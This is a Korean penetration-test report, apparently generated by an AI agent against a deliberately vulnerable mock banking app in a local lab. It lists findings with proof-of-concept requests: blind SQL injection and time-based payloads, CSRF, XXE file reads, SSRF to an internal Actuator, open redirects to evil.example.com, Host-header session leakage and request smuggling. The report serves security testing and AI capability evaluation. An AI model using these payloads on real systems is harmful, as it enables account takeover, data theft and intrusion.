nginx 1.20.1 프런트엔드는 Content-Length를, 백엔드 Tomcat 11.0.14은 Transfer-Encoding: chunked를 우선 해석하여 CL.TE 불일치가 성립합니다. 하나의 POST /login 요청에 CL=len(body)+TE:chunked를 주면 응답이 2개(때로는 3개) 돌아오고, body 안에 숨긴 요청이 백엔드에서 실제로 실행되어 /actuator/env·/admin·/manager/html 같은 내부 응답이 반환됩니다. Tomcat access log에도 스머글링 요청이 별도 엔트리(HTTP/1.0)로 기록되어 실제 파싱·실행이 확인됩니다.

### 31. [HIGH] 로그아웃 후에도 서버측 세션 유지 — MODU_SID 재사용 / 쿠키 보안속성 미설정

GET /logout 는 302로 로그아웃된 것처럼 보이지만 서버측 세션 저장소(PredictableSessionCookieFilter.registry)에서 MODU_SID를 revoke하지 않아, 로그아웃 후에도 동일 MODU_SID 쿠키로 /bank/dashboard·/bank/transfer·/mypage/api-key·/mypage/change-password 모두 200으로 접근되고 세션 신원(SessionTester)이 유지된다(코드상 invalidate()만 호출, revoke() 미호출). 또한 MODU_SID 쿠키는 HttpOnly/Secure/SameSite/Max-Age가 전부 없어 스크립트 탈취·평문 전송에 노출되며, 이전 워커가 발급한 SID(1001·1002 등)도 계속 유효해 세션 만료가 사실상 부재합니다. POST /logout 은 매핑이 없어 500을 반환합니다.

### 32. [HIGH] /bank/transfer 이체 처리의 동시성 제어 부재(TOCTOU/lost update)로 잔액 초과 인출·장부 불일치 발생

POST /bank/transfer 는 출금계좌 잔액을 조회(getBalance)→자바에서 빼기(lsub)→절대값으로 덮어쓰기(updateBalance) 하는 비원자적 로직이며 트랜잭션/락/잔액검사가 없습니다. 동일 계좌로 다수 이체를 병렬 동시 전송하면 전건이 "이체가 완료되었습니다"로 성공 처리되면서 실제 차감은 일부만 반영(lost update)되어 잔액 0원/부족 상태에서도 출금 성공, 잔액이 음수로 초과 인출되고 수취 계좌와의 장부도 불일치합니다. 잔액 1,000,000원에서 10건×1,000,000원 동시 이체로 잔액이 -2,000,000원이 되었고(수취측 +3,000,000원), 20,000,000원에서 30건 동시 이체 시 차감은 5,000,000원만·수취는 8,000,000원으로 3,000,000원이 장부상 창출됐습니다.

### 33. [HIGH] /bank/transfer/check-account accountNo 블라인드 SQL 인젝션

/bank/transfer/check-account 의 accountNo 파라미터가 파라미터 바인딩 없이 쿼리에 삽입되어 boolean 기반 블라인드 SQLi 가 성립합니다. 'AND 1=1/1=2, 서브쿼리(users 개수·password 길이), SLEEP(3) 지연 모두 응답으로 구분되어 임의 DB 데이터 추출이 가능합니다.

**PoC / 증거:**

```
GET /bank/transfer/check-account?accountNo=110-234-567890' AND '1'='1  → {"exists":true,"message":"사용 가능한 계좌입니다."}
GET ...accountNo=110-234-567890' AND '1'='2                                → {"exists":false,"message":"존재하지 않는 계좌입니다."}
GET ...accountNo=x' OR (select count(*) from users)>0-- -                  → true
GET ...accountNo=x' OR (select count(*) from users)>100-- -                → false
GET ...accountNo=x' OR (select length(password) from users where username='kim01')>3-- -  → true
GET ...accountNo=110-234-567890' AND SLEEP(3)-- -                          → 3.010s (time-based 확인)
```

### 34. [HIGH] /mypage/change-password 캡차 완전 무력화(hint 노출·정답 미검증) + CSRF 토큰 부재

비밀번호 변경 폼이 캡차 정답을 hidden `__captcha_hint`(예: 9126)로 그대로 내려주고, 서버는 captchaAnswer 값을 정답과 대조하지 않는다(오답 0000·필드 누락에도 "비밀번호가 변경되었습니다"). 또한 CSRF 토큰이 없고 Origin/Referer 검증도 없어 외부 사이트에서 로그인 세션만으로 피해자 비밀번호를 강제 변경할 수 있습니다.

**PoC / 증거:**

```
$ curl -b cookies.txt -X POST http://192.168.6.167/mypage/change-password --data "newPassword=Xy!12345&captchaAnswer=0000&__captcha_hint=9126"
→ <h2 class="result-title">비밀번호가 변경되었습니다</h2>   (captchaAnswer=0000 은 정답 9126 과 다름에도 성공)
$ curl -b cs.txt -X POST http://192.168.6.167/mypage/change-password --data "newPassword=Csrf!2026" -H "Origin: http://attacker.example" -H "Referer: http://attacker.example/csrf.html"
→ 비밀번호가 변경되었습니다  / 이후 login lee02/Csrf!2026 → 302 성공
※ 페이지 소스 커멘트: "LOW 레벨에서는 캡차 정답을 hidden input에 그대로 노출한다" + _captcha_hint=9126 노출
```

### 35. [HIGH] 오픈뱅킹 REST API /api/v1/accounts/{accountId} 의 객체 수준 권한 검증 결함(BOLA/IDOR) — 임의 계좌 잔액·계좌번호 열람

X-API-KEY 헤더만 유효하면 계좌 소유자 검증 없이 /api/v1/accounts/{accountId} 로 임의 계좌의 잔액·계좌번호·거래건수를 조회할 수 있습니다. kim01 의 API 키로 타인(admin) 계좌 1, lee02 계좌 2, park03 계좌 3 모두 열람 성공. 컨트롤러에 소유권 검사(ownershipEnforced/FORBIDDEN "not your account") 코드는 존재하나 현재 vulnLevel=LOW 에서 비활성화되어 있습니다.

### 36. [HIGH] 저장형·반사형 XSS (게시판 title/content 및 검색어 q)

/board/write 로 저장한 title(및 content)이 /board 목록과 /board/{id} 상세에서 이스케이프 없이 그대로 렌더링되어 저장형 XSS가 성립합니다. 또한 /board?q= 검색어도 반사형으로 이스케이프 없이 출력됩니다. MODU_SID=1002(관리자 세션)로 실제 페이로드를 저장·조회하여 원문 HTML 그대로 반사됨을 확인했습니다.

### 37. [HIGH] 대량이체 XML 업로드에서 XXE(XML External Entity) 취약점 — 임의 로컬파일 읽기 및 내부 SSRF

POST /bank/bulk-transfer 의 XML 파서가 외부 엔티티(DTD) 처리를 허용합니다. `<!ENTITY xxe SYSTEM "file:///etc/passwd">` 를 업로드한 XML에 정의하고 `&xxe;` 를 `<toAccountNo>` 에 참조시키면, 서버가 파일 내용을 읽어 응답의 '받는계좌' 필드에 그대로 렌더링합니다. /etc/passwd·/etc/os-release·/etc/nginx/nginx.conf·/opt/modubank/scripts/log-cleanup.sh·/etc/cron.d/modubank-log-cleanup 를 로그인 세션만으로(별도 상위 권한 없이) 읽어냈고, entity URL 을 http://127.0.0.1:8080/actuator/health 로 주면 내부 Actuator 응답이 그대로 반사되는 SSRF 도 성립합니다. 서버는 tomcat(990) 권한으로 동작하여 /etc/shadow 등 root 전용 파일은 Permission denied.

### 38. [HIGH] /admin 관리자 페이지 접근통제 미흡 및 민감정보(평문 비밀번호) 노출

/admin 관리자 대시보드가 관리자 여부와 무관하게 일반 USER 계정(kim01/password1)으로도 접근 가능합니다. 페이지에는 전체 21개 사용자 계정의 평문 비밀번호(admin123, password1, qwer1234 등)와 이름, 권한, 전체 계좌번호/잔액이 그대로 렌더링되어 노출됩니다.

**PoC / 증거:**

```
$ curl -s -b cj_kim.txt http://192.168.6.167/admin
<h2 class="page-title">관리자 대시보드</h2>
<table><tr><th>ID</th><th>아이디</th><th>비밀번호</th>...</tr>
<tr><td>1</td><td>admin</td><td>admin123</td>...
<tr><td>2</td><td>kim01</td><td>password1</td>...
... 총 21개 계정의 평문 비밀번호 + 전체 계좌 잔액 노출
=> 일반 USER 세션(kim01)으로도 HTTP 200 으로 동일 내용 반환.
```

### 39. [HIGH] Spring Boot Actuator 엔드포인트 인증 없는 노출 (민감 설정·런타임 정보 유출 및 로거 레벨 조작 가능)

http://192.168.6.167:8080 의 Spring Boot Actuator가 인증 없이 노출되어 /actuator, /env, /configprops, /beans, /mappings, /threaddump, /metrics, /health, /loggers, /conditions 등에 누구나 접근 가능합니다. 설정 파일 경로(/opt/modubank/config/application.yml)와 datasource/backdoor-admin-key 등 민감 프로퍼티의 존재·출처가 노출되고, POST /actuator/loggers/{name} 로 런타임 로거 레벨 변경(204)이 인증 없이 성공합니다. 값은 `******` 로 마스킹되어 있으나 설정 구조·비밀 키 이름·DB 접속 정보 위치 등이 그대로 드러납니다.

**PoC / 증거:**

```
$ curl -s -o /dev/null -w "%{http_code}" http://192.168.6.167:8080/actuator/env  (헤더 없이)
200
$ curl -s -X POST -H "Content-Type: application/json" -d '{"configuredLevel":"TRACE"}' http://192.168.6.167:8080/actuator/loggers/kr.co.modubank -i | head -1
HTTP/1.1 204
$ curl -s http://192.168.6.167:8080/actuator/env | grep -o '"spring.datasource.password"'
"spring.datasource.password":{"origin":"URL [file:/opt/modubank/config/application.yml] - 7:15","value":"******"}

```

### 40. [HIGH] /bank/fx/lookup 의 callbackUrl 파라미터 Full-Read SSRF

로그인 후 GET /bank/fx/lookup?callbackUrl= 값이 서버 측 HTTP 요청으로 그대로 전송되며, 응답 본문 전체가 화면에 반영된다(Full-Read SSRF). 이를 통해 내부 전용 8080 포트의 Spring Boot Actuator와 3306 내부 서비스 등에 도달할 수 있습니다.

**PoC / 증거:**

```
curl -s -b cookies.txt --get --data-urlencode 'callbackUrl=http://127.0.0.1:8080/actuator' http://192.168.6.167/bank/fx/lookup
-> <p>요청 URL: <code>http://127.0.0.1:8080/actuator</code></p> ... {"_links":{"self":{"href":"http://127.0.0.1:8080/actuator"... "env":{...},"beans":{...},"configprops":{...}}}
callbackUrl=http://127.0.0.1:8080/actuator/env -> propertySources에 spring.datasource.password, modubank.security.backdoor-admin-key 등 반영
(file:///etc/passwd -> "<div class="alert alert-danger">조회 중 오류: invalid URI scheme file</div>")
```

### 41. [MEDIUM] Host 헤더 주입으로 인한 리다이렉트 오염 및 세션 쿠키 도메인 오염·JSESSIONID 노출

nginx(:80)의 `proxy_set_header Host $host` 로 클라이언트가 보낸 Host 가 Tomcat 에 그대로 전달되고, 애플리케이션이 `"redirect:/login"`·`"redirect:/admin"` 리다이렉트를 절대 URL 로 생성하면서 주입된 Host 를 사용합니다. 그 결과 인증 없이 접근한 보호 경로(/admin, /files, /bank/dashboard 등)와 로그아웃이 `Location: http://<공격자도메인>/login` 으로 302 되어 오픈 리다이렉트가 성립하고, 로그인 시에는 `Location: http://evil.example.com/admin;jsessionid=<JSESSIONID>` 로 세션 ID 가 공격자 도메인으로 전달되며 Set-Cookie 가 공격자 도메인 스코프에 귀속됩니다. 유출된 JSESSIONID 단독으로 관리자 페이지(/admin) 200 이 확인되었습니다. Host 는 주입 가능하나 X-Forwarded-Host 는 무시되고, /find-password 리셋 링크 오염과 nginx↔Tomcat 캐시 포이즈닝, CRLF 응답분할은 모두 불성립.

### 42. [MEDIUM] MyBatis StdOutImpl 디버그 SQL 로그로 평문 비밀번호·API 키·개인정보 기록(CWE-532)

배포 application.yml 에 `mybatis.configuration.log-impl: org.apache.ibatis.logging.stdout.StdOutImpl` 가 주석 "[의도적 취약점] SQL 로그를 그대로 콘솔에 노출"과 함께 설정되어 있어, 실행되는 모든 쿼리 원문·바인딩 파라미터·결과 전체 행(users 테이블의 평문 password·security_answer·api_key 포함)이 stdout으로 출력되고 systemd(catalina.sh run)→journald 에 영구 저장됩니다. 실제 journalctl 출력 3.6MB를 회수해 admin/kim01/lee02 등의 평문 자격증명·API 키·보안질문 답변이 그대로 남아 있음을 확인했습니다. 단, journald는 tomcat 권한으로 직접 열람 불가(권한 거부)하여 순수 무인증 접근은 성립하지 않고, root/로그 접근 권한 확보(기존 `#358` cron 권한상승, `#423` SSH 재사용 등) 후 대량 크리덴셜 덤프로 직결되는 2차 노출 경로입니다. 별도의 웹 디버그 콘솔 엔드포인트(/sql,/console,/debug,/logs,/diag,/h2-console,/druid,/actuator/logfile)는 모두 500으로 존재하지 않아 '콘솔 페이지' 형태는 반증됐습니다. (공격 체인: cron 권한상승(3·12번)으로 root를 얻어 이 로그를 회수하면 평문 자격증명이 대량 유출돼 admin·kim01 등 계정 장악으로 직결되는 것이 PoC로 확인됐습니다.)

### 43. [MEDIUM] 보안 헤더(X-Frame-Options/CSP) 미설정으로 인한 클릭재킹(Clickjacking)

모두뱅크 192.168.6.167의 :80(nginx) 및 :8080(Tomcat) 응답에는 X-Frame-Options, Content-Security-Policy(frame-ancestors), Strict-Transport-Security, X-Content-Type-Options, Referrer-Policy, Permissions-Policy가 전혀 없어 /login 및 인증 후 화면(/bank/transfer 등)을 외부 사이트 iframe에 그대로 삽입할 수 있습니다. 실제 Chromium(Playwright)으로 외부 페이지에 투명 iframe(opacity:0)을 겹치고 그 위의 미끼 버튼('#dec') 클릭을 iframe 내부 로그인 폼으로 전달해 POST http://192.168.6.167/login 이 발생함을 확인했다(클릭 하이재킹 성립).

### 44. [MEDIUM] Unauthenticated Spring Boot Actuator Exposure (Information Disclosure + Unauthenticated Management Write)

192.168.6.167:8080(Tomcat 직접)과 :80(nginx 프록시) 양쪽에서 Spring Boot Actuator 엔드포인트가 인증 없이 노출되어, 무인증 사용자가 /actuator/env, configprops, beans, threaddump, mappings, loggers, conditions, metrics, health, scheduledtasks, sbom 을 200으로 열람하고 /actuator/loggers/{name} 에 POST로 로그 레벨을 실제 변경(204, effectiveLevel DEBUG/TRACE 적용)할 수 있습니다. 응답에서 `/opt/tomcat/webapps/ROOT/WEB-INF/classes/kr/co/modubank/*.class` 전체 클래스 목록·내부 배포경로, 설정파일 실경로(/opt/modubank/config/application.yml), DB 종류(MariaDB)·HikariCP 커넥션 메트릭, 41개 스레드(ajp 8009 포함), 애플리케이션 전체 매핑 경로가 노출됩니다. 다만 env/configprops 값은 show-values=ALWAYS 로도 전부 `******` 로 마스킹되어 DB 자격증명·backdoor-admin-key 평문은 유출되지 않았고, heapdump·jolokia·refresh·shutdown·sessions·httptrace·logfile·prometheus·caches 는 미노출(500 NoResourceFound), env POST/PUT 도 500(HttpRequestMethodNotSupportedException)이라 Actuator 경유 설정 조작·RCE 는 성립하지 않았습니다.

### 45. [MEDIUM] 모두뱅크 GET /board/notice?doc= 템플릿 이름 경로순회로 인한 비인증 접근통제 우회

비인증 사용자가 doc 파라미터의 ../ 시퀀스로 templates 디렉터리 내 임의 템플릿(admin/dashboard, mypage/api-key, mypage/change-password, bank/transfer, bank/fx, bank/bulk-transfer, board/write 등)을 200으로 렌더링할 수 있습니다. 이들 화면은 정상 경로에서 전부 302 /login으로 보호되므로 인증 게이트를 완전히 우회합니다. 다만 NoticeController가 모델 속성을 전혀 채우지 않아 렌더링 결과는 빈 목록/빈 값이며 계좌·API키·사용자 데이터 유출로는 이어지지 않았고, doc으로 templates 루트 밖 파일(/etc/passwd, application.yml, web.xml) 읽기는 500으로 차단됩니다. 부수적으로 무인증 렌더링 결과에 '[의도적 취약점 …]' 소스 주석과 내부 API 경로·엔드포인트 구조가 그대로 노출됩니다.

### 46. [MEDIUM] POST /login redirect 파라미터 오픈 리다이렉트 (외부 도메인 Location 반사, 스킴 인젝션 동반)

모두뱅크 로그인 성공 후 302 응답의 Location 헤더가 사용자 입력 redirect 값을 검증 없이 그대로 사용한다(LOW 레벨). 정상 사용자 계정으로 로그인하면서 redirect=https://evil.example.com/phish 를 보내면 Location: https://evil.example.com/phish 로 실제 리다이렉트되어, 신뢰된 은행 로그인 URL에서 피싱 페이지로 유도하는 오픈 리다이렉트가 성립합니다. 등록된 실계정(자체 signup으로 생성)으로 재현되므로 특정 취약 계정에 한정되지 않으며, 80(nginx)/8080(Tomcat) 양쪽에서 동일하게 확인됩니다. 동일 경로로 javascript:/data:/vbscript: 스킴 값도 Location에 그대로 반사되는 스킴 인젝션 표면이 존재한다(브라우저 실행 여부는 환경에 브라우저가 없어 미검증).

### 47. [MEDIUM] VulnLevel LOW 전역 예외 핸들러의 전체 스택트레이스/ORM 오류 노출 및 /protected/* 접근제어 우회

GlobalExceptionHandler가 LOW/MEDIUM에서 예외 stack trace를 그대로 응답(`<pre>sw</pre>`)에 담아 반환한다(실제 /protected/ 에 POST/PUT/OPTIONS 시 500 + 전체 스택). 또한 web.xml 의 /protected/* GET 거부를 HEAD/기타 메서드가 회피하며, Spring NoResourceFoundException 원문이 노출됩니다.

### 48. [MEDIUM] 회원가입 입력값 검증 미비 — 빈 비밀번호 계정 생성·무비밀번호 로그인 및 중복검사 제어문자 우회

POST /signup 은 password/name/email/phone/securityAnswer 에 대해 아무 형식·강도 검증을 하지 않아 비밀번호가 빈 문자열인 계정이 정상 생성되고, POST /login 에 같은 빈 비밀번호를 보내면 세션이 발급되어 인증이 성립한다(비밀번호 정책·필수값 검증 부재). 또한 아이디 중복검사가 제어문자에 대해 정규화를 하지 않아 `"admin\t"`, `"kim01\t"` 처럼 실제 계정과 충돌하지 않는 유사 아이디를 무제한 생성할 수 있고, 관리자 대시보드에는 TAB/개행이 비가시라 'admin' 처럼 표시되어 관리자·감사기록을 혼동시킬 수 있습니다. 가입 시 role/isAdmin/authorities 등 미선언 필드 주입(mass assignment)으로는 관리자 권한이 부여되지 않았고, 기존 admin 계정 덮어쓰기(자격증명·권한 변경)도 성립하지 않았다(별도 사실로 기록).

### 49. [MEDIUM] /login 의 redirect 파라미터 Open Redirect

로그인 성공 후 POST /login 의 redirect 파라미터 값으로 검증 없이 302 Location 을 반환합니다. redirect=http://evil.example.com 또는 //evil.example.com 등 외부 도메인으로 리다이렉트되어 피싱/토큰 탈취에 악용될 수 있습니다.

**PoC / 증거:**

```
$ curl -s -i -X POST http://192.168.6.167/login --data-urlencode "username=admin" --data-urlencode "password=admin123" --data-urlencode "redirect=http://evil.example.com" | grep -i Location
Location: http://evil.example.com
$ ... --data-urlencode "redirect=//evil.example.com" | grep -i Location
Location: http://evil.example.com
$ ... --data-urlencode "redirect=https://attacker.test/x" | grep -i Location
Location: https://attacker.test/x
(로그인 폼 hidden 입력 name="redirect"; 코드 주석: [의도적 취약점 - Open HTTP Redirect] AuthController.resolveRedirectDestination)
```

### 50. [LOW] Apache Tomcat 11.0.14: HTTP/0.9(버전 생략) 요청에서 HEAD 메서드가 무시되어 응답 본문이 반환됨

192.168.6.167:8080의 Tomcat 11.0.14는 `HEAD <URI> CRLF` 형태의 버전 없는 HTTP/0.9 요청을 정상 처리하면서 HEAD 시맨틱(본문 미전송)을 적용하지 않아, 동일 URL의 HTTP/1.1 HEAD로는 헤더만 오지만 0.9 형식으로는 응답 본문 전체가 반환된다(예: /etc/passwd 1509B, /i227/index.jsp 30B, / 4109B). 다만 Tomcat 정적 리소스 핸들러(/protected/*, /css/*)의 0.9 HEAD는 0B이므로 web.xml GET 거부 우회(CVE-2026-24733)로는 이어지지 않았고, 실제 영향은 GET 대비 추가 노출 없는 낮은 수준입니다.

### 51. [LOW] 오픈뱅킹 REST API errorBody가 LOW 보안레벨에서 내부 예외 클래스·파싱 입력값을 그대로 노출

OpenBankingApiController.errorBody는 vulnLevel이 LOW/MEDIUM이면 예외 정보를 응답 JSON에 포함하고 HIGH 이상에서만 제거합니다. 현재 default-vuln-level=LOW인 상태에서 /api/v1/transfer에 빈 JSON(`{}`)을 보내면 `{"error":"internal error","exception":"java.lang.NumberFormatException","detail":"For input string: \"null\""}`(500)가 반환되어 내부 예외 타입과 파싱 입력값이 유출됩니다. 동일 설정을 HIGH로 바꿔 재기동하면 응답이 `{"error":"internal error"}`로 축소되어 분기 동작이 실제로 확인됐습니다.

### 52. [LOW] /protected/* security-constraint 메서드별 인가 불일치 (GET 403 / HEAD 200)

WEB-INF/web.xml 의 'protected-get-denied' 제약이 GET 에만 auth-constraint 를 걸고 HEAD 는 별도 제약으로 허용해, 동일 보호 리소스에 대해 GET 은 403 이지만 HEAD 는 200 과 함께 Content-Length/Content-Range/Last-Modified 등 메타데이터가 노출됩니다. 본문 자체는 HEAD 특성상 반환되지 않았고 HTTP/0.9·소문자 메서드·경로 정규화 우회도 모두 실패했으나, 인가 판단이 메서드별로 불일치한다는 결함은 실제 요청으로 확인되었습니다.

### 53. [LOW] Exposed Service / Missing Authentication (Tomcat AJP connector)

Tomcat AJP/1.3 커넥터(8009)가 requiredSecret 미설정 상태로 네트워크에 노출되어, 인증 없이 임의의 요청을 백엔드로 포워딩할 수 있습니다. Ghostcat(CVE-2020-1938)은 패치되어 파일 읽기/주입은 불가하나, 커넥터 자체가 무인증으로 노출된 점은 설정 미비입니다.

**PoC / 증거:**

```
python3 ajp3.py (secret 미전송): [baseline-root] status=200 (모의뱅킹 앱 응답). nmap -Pn -sV -p8009 192.168.6.167 → '8009/tcp open ajp13 Apache Jserv (Protocol v1.3)', ajp-brute: 'URL does not require authentication'. Ghostcat 페이로드('[ghostcat-web.xml] status=403 ... Apache Tomcat/11.0.14')로 패치 확인.
```


## 정리

이번 실행에서 확인된 핵심은, 목표를 "모든 취약점"으로 열어 두자 DeepSeek V4.1 Flash가 약 3시간 동안 worker 55개로 넓게 훑어 RCE(명령 주입·업로드·Tomcat Manager·경로순회 배치)부터 인증 우회(예측 가능 세션·로그인 SQL 인젝션·일반 사용자 /admin), 권한 상승(world-writable root cron), 비즈니스 로직(소유권 미검증·음수/동시성 이체), 정보 노출(평문 비밀번호·경로 순회·Actuator), CSRF·XSS·SSRF·XXE·요청 스머글링까지 보고했다는 점입니다. 중복을 묶으면 유형 수는 53건보다 줄어듭니다.

확인된 결과는 성격이 서로 다릅니다. OS 명령 실행은 `/bank/connectivity/check`에서 tomcat(uid 990) 권한으로 확인됐고, cron 경로로 root 권한 상승과 `/etc/shadow` 열람까지 PoC가 제시됐습니다. 반면 CSRF·세션 고정·Host 헤더 주입·CL.TE 스머글링처럼 curl 단계 동작만으로 확인된 항목은, 실제 브라우저의 교차 사이트 쿠키 전송이나 프록시 desync 경계까지 재현해야 영향이 확정됩니다. 자격증명 수치가 항목마다 다른 것은 실행 중 서버 상태가 계속 바뀐 탓이며, 같은 시점의 증거로 묶을 수 없습니다.

범위는 로컬 랩 NAT 대역의 단일 호스트이고 모델당 1회 실행이며, 근거는 ARTEX 최종 보고서와 그 PoC입니다. 다음 단계는 보고된 항목을 수동으로 재현해 확정하고, 네 실행이 차례로 남긴 흔적(업로드 JSP·배포 WAR·게시글·변경된 비밀번호·이체 내역)을 VM 스냅샷 복원으로 초기화한 뒤 로그와 대조하는 것입니다.
